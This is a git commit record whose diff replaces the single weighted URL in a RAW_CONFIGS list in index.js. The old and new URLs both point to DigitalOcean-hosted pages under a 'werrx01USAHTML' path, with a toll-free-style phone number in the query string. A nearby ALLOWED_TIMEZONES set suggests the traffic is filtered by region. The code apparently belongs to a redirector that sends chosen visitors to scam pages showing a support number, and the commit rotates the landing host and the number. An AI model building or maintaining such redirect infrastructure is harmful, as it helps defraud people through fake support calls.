11eba42cdc159a24aa49c69bc51e835758fe6a9f
paalakash <palaksh452@gmail.com>
2026-07-14 09:28:31 +0530

    Add new URL to RAW_CONFIGS
    Updated RAW_CONFIGS with a new URL entry.

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://oyster-app-2-jrszt.ondigitalocean.app/werrx01USAHTML/?bcda=1800-051-206", weight: 1.0 }
+    { url: "https://sea-lion-app-8ssfp.ondigitalocean.app/werrx01USAHTML/?bcda=1800-549-821", weight: 1.0 }
     
 ];
 
